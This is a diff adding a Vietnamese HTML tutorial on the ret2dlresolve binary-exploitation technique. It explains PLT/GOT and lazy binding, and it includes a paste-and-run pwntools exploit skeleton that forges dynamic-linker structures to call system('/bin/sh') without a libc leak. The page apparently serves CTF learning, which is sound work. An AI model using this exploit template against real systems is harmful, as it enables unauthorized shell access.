@@ -1,0 +1,934 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>ret2dlresolve</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+/* Layout: cột đọc ~740px; lab/diagram tràn rộng hơn. Tông gạch nung trên nền đá phiến, xanh cho "địa chỉ/bộ nhớ" */
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;font-feature-settings:"ss01";word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}
+a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}
+.combat-row pre{margin:4px 0 0}
+
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}pre .f{color:#c9a0dc}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}
+.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+
+/* Lab chung */
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.lab-head{display:flex;align-items:baseline;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:4px}
+.lab-head h3{margin:0}.lab-sub{font-size:13px;color:var(--muted)}
+
+/* Resolve-chain visualizer */
+.chain{display:flex;flex-direction:column;gap:10px;margin-top:14px}
+.node{border:1px solid var(--line);border-radius:12px;padding:12px 14px;background:var(--surface-2);transition:background .2s,border-color .2s,box-shadow .2s;opacity:.55}
+.node.active{opacity:1;border-color:var(--accent);background:var(--accent-soft);box-shadow:0 0 0 2px var(--accent-soft)}
+.node.done{opacity:1}
+.node .nh{font-family:var(--font-mono);font-size:12.5px;font-weight:700;color:var(--mem);display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap}
+.node .nh .t{color:var(--fg)}
+.node .nb{font-size:13.5px;color:var(--muted);margin-top:4px}
+.node .nb b{color:var(--fg)}
+.arrow{text-align:center;color:var(--accent);font-size:13px;font-family:var(--font-mono);opacity:.5;margin:-4px 0}
+.arrow.lit{opacity:1;font-weight:700}
+.stepbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:14px}
+.btn{font-family:var(--font-mono);font-size:13px;border:1px solid var(--line);background:var(--surface-2);color:var(--fg);padding:8px 14px;border-radius:9px;cursor:pointer;transition:background .15s}
+.btn:hover{background:var(--accent-soft)}
+.btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+.stepcount{font-family:var(--font-mono);font-size:12.5px;color:var(--muted)}
+.explain{margin-top:12px;background:var(--mem-soft);border:1px solid var(--line);border-radius:10px;padding:12px 14px;font-size:14px;min-height:42px}
+.explain b{color:var(--mem)}
+
+/* bss layout block */
+.bssblk{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin-top:10px}
+.bssrow{display:grid;grid-template-columns:120px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:7px 10px;background:var(--surface-2)}
+.bssrow .a{color:var(--mem);white-space:nowrap}
+.bssrow.r{background:var(--accent-soft);border-color:var(--accent)}
+.bssrow.sym{background:var(--mem-soft);border-color:var(--mem)}
+.bssrow.str{background:var(--ok-soft);border-color:var(--ok)}
+
+/* step list */
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+
+/* exploit tabs */
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+
+/* requirement checklist */
+.req{display:flex;flex-direction:column;gap:8px;margin:14px 0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem.must{border-left:3px solid var(--danger)}
+.reqitem.help{border-left:3px solid var(--mem)}
+.reqitem h4{margin:0 0 2px;font-size:15px}
+.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.reqitem code{font-size:.85em}
+
+.check li{list-style:none;position:relative;padding-left:26px}
+ul.check{padding-left:0}
+ul.check li::before{content:"▸";position:absolute;left:4px;color:var(--accent);font-weight:700}
+
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}
+details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.85}
+.ttoggle:hover{opacity:1}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+figure{margin:22px 0}
+figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+figcaption code{font-size:.85em}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Binary Exploitation · Nâng cao</div>
+    <h1>ret2dlresolve</h1>
+    <p class="sub">Ép chính trình liên kết động (linker) tự tay "resolve" hàm <code>system</code> cho bạn — khai thác được <strong>mà không cần leak địa chỉ libc</strong>. Giải thích từ gốc: PLT, GOT, lazy binding, rồi tới chỗ ta lừa.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Nâng cao (cần biết ROP)</span>
+      <span class="chip"><b>Cần trước:</b> Stack overflow, PLT/GOT cơ bản</span>
+      <span class="chip"><b>Thời lượng:</b> ~60 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Ba cấu trúc</a><a href="#s4">04 Mô phỏng</a><a href="#s5">05 Điều kiện cần</a>
+      <a href="#s6">06 Tự tìm info</a><a href="#s7">07 Ví dụ thực tế</a><a href="#s8">08 Công cụ</a>
+      <a href="#s9">09 Gỡ lỗi</a><a href="#s10">10 Nhận diện</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 TLDR -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Vấn đề:</strong> bạn có lỗi tràn stack (chiếm được luồng chạy), nhưng chương trình <em>không in gì</em> để bạn leak địa chỉ libc, và trong file cũng không có sẵn hàm <code>system</code> hay chuỗi <code>"/bin/sh"</code>. Các cách thông thường (ret2libc) bí vì chúng cần biết libc nằm ở đâu.</p>
+    <p><strong>Ý tưởng:</strong> mỗi chương trình động đều có một "nhân viên" tên <mark>_dl_runtime_resolve</mark> chuyên đi tìm địa chỉ thật của hàm libc <em>theo tên</em>. Ta <strong>giả mạo mấy tờ giấy tờ</strong> mô tả một cái tên — và nhờ chính nhân viên đó tra hộ cái tên <code>"system"</code>, rồi gọi luôn.</p>
+    <p><strong>Kết quả:</strong> <code>system("/bin/sh")</code> chạy, ra shell — mà ta <em>chưa từng biết</em> libc ở địa chỉ nào.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>lazy binding cho phép "gọi hàm theo tên" lúc chạy. ret2dlresolve = giả mạo đống dữ liệu mô tả cái tên đó rồi nhờ linker tra hộ — nên không cần leak gì cả.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — đọc khi đang thi, bắt tay giải liền</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        <p><code>checksec</code>: <b>No PIE + Partial RELRO</b> · có <b>overflow</b> · <b>không leak được</b> gì · trong file <b>không có</b> <code>system</code>/<code>/bin/sh</code> → dùng <b>ret2dlresolve</b>.</p></div>
+      <div class="combat-row"><span class="lab">✅ Điều kiện bắt buộc</span>
+        <p>No PIE · Partial/No RELRO · liên kết động · có <code>read</code>/<code>gets</code> ghi được <code>.bss</code> · đủ gadget (<code>pop rdi</code> hoặc ret2csu). Có canary thì phải bypass trước. <b>Không cần biết libc version.</b></p></div>
+      <div class="combat-row"><span class="lab">🔧 3 lệnh lấy số</span>
+        <p><code>checksec ./chall</code> xác nhận → <code>cyclic 200</code> + GDB tìm <b>OFFSET</b> tới saved RIP → JMPREL/SYMTAB/STRTAB + <code>.bss</code> để pwntools tự lo.</p></div>
+      <div class="combat-row"><span class="lab">⚡ Skeleton — dán chạy ngay</span>
+<pre><code><span class="k">from</span> pwn <span class="k">import</span> *
+<span class="k">from</span> pwnlib.rop.ret2dlresolve <span class="k">import</span> Ret2dlresolvePayload
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)                      <span class="c"># hoặc remote("host", port)</span>
+dl  = Ret2dlresolvePayload(exe, symbol=<span class="s">"system"</span>, args=[<span class="s">"/bin/sh"</span>])
+rop = ROP(exe)
+rop.read(<span class="d">0</span>, dl.data_addr, <span class="d">len</span>(dl.payload))
+rop.ret2dlresolve(dl)
+p.send(flat(b<span class="s">"A"</span>*<span class="d">OFFSET</span>, rop.chain()))        <span class="c"># OFFSET = buf + 8 (tìm bằng cyclic)</span>
+p.send(dl.payload)
+p.interactive()</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Kẹt thì xem</span>
+        <p>SIGSEGV trong resolver → đổi vùng <code>.bss</code> (glibc mới) · SIGILL → thêm 1 <code>ret</code> căn stack 16B · <code>read</code> thiếu byte → set đủ <code>rdx</code> · sai OFFSET → tính lại <code>cyclic</code>. Chưa hiểu vì sao? đọc tiếp các mục dưới.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 Prereq -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Hàm libc được "nối" vào chương trình như thế nào</h2>
+  <p>Toàn bộ kỹ thuật xoay quanh cơ chế bình thường này. Hiểu nó rồi, phần "lừa" sẽ rất cơ học. Chưa chắc 4 ý dưới thì ret2dlresolve sẽ như phép thuật.</p>
+
+  <h3>1 · Dynamic linking — code của <code>system</code> không nằm trong file bạn</h3>
+  <p>File chương trình động (biên dịch bình thường, không <code>-static</code>) <strong>không chứa</strong> code của <code>system</code>, <code>puts</code>… Nó chỉ ghi chú: "tôi cần hàm tên <code>system</code> lấy từ thư viện <code>libc</code>". Lúc chạy, một chương trình riêng tên <span class="mem-term">dynamic linker</span> (còn gọi <code>ld.so</code> / rtld) nạp libc vào bộ nhớ rồi điền địa chỉ thật của từng hàm vào một bảng con trỏ để chương trình gọi.</p>
+  <div class="note"><span class="tag">Định nghĩa</span><strong>"Resolve một symbol"</strong> = tìm ra địa chỉ thật của hàm <em>theo tên</em>, rồi ghi lại địa chỉ đó để lần sau gọi thẳng. "Symbol" ở đây hiểu nôm na là "một cái tên hàm/biến".</div>
+
+  <h3>2 · PLT và GOT — hai cái bảng cốt lõi</h3>
+  <p>Khi code gọi <code>system()</code>, trình biên dịch <em>không</em> gọi thẳng vào libc (chưa biết địa chỉ mà gọi). Nó gọi một cái cầu trung gian tên <code>system@plt</code>. Hai bảng liên quan:</p>
+  <div class="grid">
+    <div class="card"><div class="term">GOT · .got.plt</div><h4>Bảng con trỏ hàm</h4><p>Mỗi hàm ngoại một ô 8 byte. Đây là nơi <em>cuối cùng</em> chứa địa chỉ thật của <code>system</code> sau khi resolve. GOT <strong>ghi được</strong> (nằm vùng data).</p></div>
+    <div class="card"><div class="term">PLT · .plt</div><h4>Các mẩu code cầu nối</h4><p><code>system@plt</code> thực chất chỉ là lệnh <code>jmp *system@got</code> — "nhảy tới địa chỉ đang nằm trong ô GOT của system".</p></div>
+  </div>
+  <p>Luồng bình thường: <code>call system@plt</code> → PLT làm <code>jmp *[got]</code> → ô got chứa địa chỉ thật → chạy <code>system</code>.</p>
+
+  <h3>3 · Lazy binding — mấu chốt</h3>
+  <p>Resolve hết mọi hàm ngay lúc khởi động thì chậm (nhiều hàm có thể chẳng bao giờ được gọi). Nên mặc định dùng <span class="mem-term">lazy binding</span>: <strong>chỉ resolve khi hàm được gọi lần đầu tiên</strong>. Mẹo: ô GOT ban đầu <em>không</em> trỏ tới <code>system</code> thật, mà trỏ <em>ngược về</em> ngay dòng lệnh sau trong PLT stub của chính nó:</p>
+  <pre><code><span class="k">system@plt</span>:
+    jmp   *system@got.plt   <span class="c">; (1) ô GOT còn trỏ về (2) ngay dưới → không đi đâu cả</span>
+    push  &lt;reloc_index&gt;     <span class="c">; (2) đẩy "số thứ tự relocation" của system lên stack</span>
+    jmp   plt0              <span class="c">; (3) nhảy về PLT[0]</span>
+<span class="k">plt0</span>:
+    push  *(got+8)          <span class="c">; đẩy link_map (mô tả binary này, do ld.so dựng)</span>
+    jmp   *(got+16)         <span class="c">; nhảy vào _dl_runtime_resolve</span></code></pre>
+
+  <figure class="dg">
+  <svg viewBox="0 0 760 240" role="img" aria-label="Lần gọi hàm đầu tiên phải đi vòng qua _dl_runtime_resolve để điền GOT; lần gọi sau nhảy thẳng từ GOT tới system" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <defs>
+      <marker id="ah" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor" stroke="none"/></marker>
+      <marker id="ahA" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker>
+    </defs>
+    <text x="8" y="16" font-size="13" font-weight="700" fill="currentColor" stroke="none">① Lần gọi ĐẦU — đi vòng qua linker để resolve</text>
+    <rect x="8"   y="30" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <rect x="212" y="30" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <rect x="416" y="30" width="150" height="46" rx="8" stroke-width="1.7" stroke="#e8663e"/>
+    <rect x="620" y="30" width="132" height="46" rx="8" stroke-width="1.5"/>
+    <text x="83"  y="58" font-size="12.5" text-anchor="middle" fill="currentColor" stroke="none">call system@plt</text>
+    <text x="287" y="52" font-size="12.5" text-anchor="middle" fill="currentColor" stroke="none">GOT[system]</text>
+    <text x="287" y="68" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.65">(chưa có địa chỉ)</text>
+    <text x="491" y="58" font-size="11.5" text-anchor="middle" fill="#e8663e" stroke="none">_dl_runtime_resolve</text>
+    <text x="686" y="52" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">system thật</text>
+    <text x="686" y="68" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.65">(trong libc)</text>
+    <line x1="158" y1="53" x2="208" y2="53" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah)"/>
+    <line x1="362" y1="53" x2="412" y2="53" stroke="#e8663e" stroke-width="1.6" marker-end="url(#ahA)"/>
+    <text x="387" y="46" font-size="10" text-anchor="middle" fill="#e8663e" stroke="none">push idx→plt0</text>
+    <line x1="566" y1="53" x2="616" y2="53" stroke="#e8663e" stroke-width="1.6" marker-end="url(#ahA)"/>
+    <text x="591" y="46" font-size="10" text-anchor="middle" fill="#e8663e" stroke="none">gọi</text>
+    <path d="M491,76 L491,100 L287,100 L287,78" stroke="#e8663e" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ahA)"/>
+    <text x="389" y="114" font-size="11" text-anchor="middle" fill="#e8663e" stroke="none">ghi địa chỉ thật vào GOT (lần sau khỏi resolve)</text>
+    <text x="8" y="150" font-size="13" font-weight="700" fill="currentColor" stroke="none">② Lần gọi SAU — GOT đã có địa chỉ, nhảy thẳng</text>
+    <rect x="8"   y="164" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <rect x="212" y="164" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <rect x="416" y="164" width="150" height="46" rx="8" stroke-width="1.5"/>
+    <text x="83"  y="192" font-size="12.5" text-anchor="middle" fill="currentColor" stroke="none">call system@plt</text>
+    <text x="287" y="186" font-size="12.5" text-anchor="middle" fill="currentColor" stroke="none">GOT[system]</text>
+    <text x="287" y="202" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.65">(đã có addr)</text>
+    <text x="491" y="192" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">system thật</text>
+    <line x1="158" y1="187" x2="208" y2="187" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah)"/>
+    <line x1="362" y1="187" x2="412" y2="187" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah)"/>
+    <text x="387" y="180" font-size="10" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.65">nhảy thẳng</text>
+  </svg>
+  <figcaption>Lazy binding: lần gọi đầu đi qua <code>_dl_runtime_resolve</code> để tìm địa chỉ thật và ghi vào GOT; từ lần sau GOT đã có sẵn nên nhảy thẳng. <strong>ret2dlresolve chèn vào đúng bước "lần gọi đầu" này.</strong></figcaption>
+  </figure>
+
+  <p>Nói cách khác, <strong>lần gọi đầu thực chất là gọi <mark>_dl_runtime_resolve(link_map, reloc_index)</mark></strong>. Hàm này resolve xong sẽ ghi địa chỉ thật vào ô GOT, nên <em>lần sau</em> <code>jmp *[got]</code> mới nhảy thẳng tới <code>system</code>.</p>
+
+  <div class="note"><span class="tag">Hai tham số này là gì?</span>
+  <strong>reloc_index</strong> — chỉ là một <em>con số đếm</em>: "cái relocation thứ mấy trong danh sách". Bình thường 0, 1, 2… (vd <code>read</code> là số 0). Khi khai thác, <strong>ta</strong> tự đẩy một số lớn do ta chọn. Nó đến từ lệnh <code>push &lt;reloc_index&gt;</code> ở trên.<br><br>
+  <strong>link_map</strong> — một <em>hồ sơ</em> (struct) ld.so tự dựng, mô tả module đang chạy: nạp ở đâu, bảng symbol ở đâu… Giá trị là một địa chỉ kiểu <code>0x7ffff7ffe190</code>. <strong>Ta KHÔNG phải làm giả nó</strong> — lệnh <code>push *(got+8)</code> trong PLT[0] tự đẩy cái thật lên; ta chỉ việc đi qua PLT[0]. Quên nó đi cũng được.</div>
+
+  <h3>4 · Vì sao điều này mở ra khai thác?</h3>
+  <p><code>_dl_runtime_resolve</code> nhận <code>reloc_index</code> <strong>từ stack</strong> (do lệnh <code>push</code> đẩy lên). Trong khai thác, ta kiểm soát stack → ta tự gọi <code>_dl_runtime_resolve</code> với <code>reloc_index</code> <em>do ta chọn</em>, trỏ tới cấu trúc <strong>giả</strong> ta dựng. Linker <strong>không kiểm tra</strong> <code>reloc_index</code> có nằm trong giới hạn, cũng không kiểm tra các cấu trúc có hợp lệ. Nó cứ đọc tên hàm từ chuỗi <em>ta đặt</em> (<code>"system"</code>), tra trong libc, rồi gọi — mà ta không cần biết libc ở đâu.</p>
+  <div class="note tip"><span class="tag">Nói ngắn</span>Lazy binding = "gọi hàm theo tên lúc runtime". ret2dlresolve = giả mạo các cấu trúc mô tả cái tên đó (<code>Rela → Sym → chuỗi "system"</code>) rồi nhờ <code>_dl_runtime_resolve</code> resolve hộ.</div>
+ </div>
+</section>
+
+<!-- 02 Why -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO KỸ THUẬT RA ĐỜI</div>
+  <h2>Nó giải quyết bế tắc gì?</h2>
+  <p>Giả sử bạn đã tràn được stack và điều khiển luồng chạy. Để mở shell, cách phổ biến là <strong>ret2libc</strong>: gọi <code>system("/bin/sh")</code> trong libc. Nhưng muốn vậy phải biết <code>system</code> nằm ở địa chỉ nào — mà <strong>ASLR</strong> xáo trộn libc mỗi lần chạy. Nên ret2libc cần một bước <em>leak</em>: ép chương trình in ra một địa chỉ libc để tính ngược. </p>
+  <p>Vấn đề: <strong>nhiều challenge không cho bạn leak gì cả</strong> — không hàm in, hoặc chỉ cho ghi đúng một lần rồi kết thúc. Lúc đó ret2libc tắc. ret2dlresolve sinh ra đúng cho tình huống này: nó mượn một cơ chế <em>có sẵn trong mọi binary động</em> (linker tra tên hàm) nên <strong>không cần biết libc ở đâu, không cần leak</strong>.</p>
+
+  <figure class="dg">
+  <svg viewBox="0 0 720 200" role="img" aria-label="ret2libc cần thêm bước leak địa chỉ libc; ret2dlresolve bỏ qua bước leak, nhờ linker resolve theo tên" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <defs>
+      <marker id="ah3" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor" stroke="none"/></marker>
+      <marker id="ah3A" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#e8663e" stroke="none"/></marker>
+    </defs>
+    <text x="8" y="15" font-size="12.5" font-weight="700" fill="currentColor" stroke="none">ret2libc — cần một bước LEAK</text>
+    <rect x="8"   y="24" width="150" height="42" rx="8" stroke-width="1.5"/>
+    <rect x="196" y="24" width="150" height="42" rx="8" stroke-width="1.8" stroke="#e8663e"/>
+    <rect x="384" y="24" width="150" height="42" rx="8" stroke-width="1.5"/>
+    <rect x="572" y="24" width="140" height="42" rx="8" stroke-width="1.5"/>
+    <text x="83"  y="49" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">overflow</text>
+    <text x="271" y="44" font-size="12" text-anchor="middle" fill="#e8663e" stroke="none">LEAK địa chỉ libc</text>
+    <text x="271" y="59" font-size="9.5" text-anchor="middle" fill="#e8663e" stroke="none">(cần hàm in — thường thiếu!)</text>
+    <text x="459" y="49" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">tính &amp;system</text>
+    <text x="642" y="49" font-size="11.5" text-anchor="middle" fill="currentColor" stroke="none">system("/bin/sh")</text>
+    <line x1="158" y1="45" x2="192" y2="45" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah3)"/>
+    <line x1="346" y1="45" x2="380" y2="45" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah3)"/>
